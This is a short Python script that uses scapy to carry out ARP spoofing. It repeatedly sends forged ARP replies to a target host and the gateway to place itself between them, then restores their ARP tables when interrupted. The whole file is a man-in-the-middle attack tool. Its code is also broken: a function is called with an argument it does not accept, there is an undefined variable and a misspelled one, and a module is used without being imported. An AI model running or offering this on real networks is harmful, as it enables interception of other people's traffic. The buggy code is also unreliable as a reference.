import scapy.all as scapy
import time 



def get_mac():
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request
	answerd_list = scapy.srp(arp_request_broadcast, timeout = 2, verbose = False)[0]

	return answerd_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(soucre_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=soucre_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)



target_ip = ""
gateway_ip = ""

try:
	packet_sent_count = 0
	while True:
		spoof(target_ip,gateway_ip)
		spoof(gateway_ip,target_ip)
		packet_sent_count = packet_sent_count + 2
		print("\r[+] Sent " + str(packet_sent_count))
		sys.stdout.flush


except KeyboardInterrupt:
	print("\nDetected CTRL + c ... Resetting ARP tables... Please wait\n")
	restore(target_ip,gateway_ip)
	restore(gateway_ip,target_ip)